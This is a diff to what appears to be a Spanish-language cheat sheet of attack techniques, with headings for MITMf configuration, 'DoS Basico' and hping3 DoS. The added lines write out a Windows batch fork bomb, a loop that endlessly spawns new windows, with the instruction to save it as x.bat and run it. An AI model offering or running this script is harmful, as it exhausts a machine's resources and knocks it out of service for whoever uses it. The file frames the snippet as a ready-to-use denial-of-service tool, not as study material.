@@ -66,6 +66,13 @@ Dns port in use -->>>>>  Modificar el puerto DNS en el archivo /etc/mitmf/mitmf.
 
 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<DoS Basico<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+_________________________________________________Win BAT
+
+:a
+start
+goto a
+
+#save como x.bat and run it
 
 _________________________________________________hping3 DoS
 
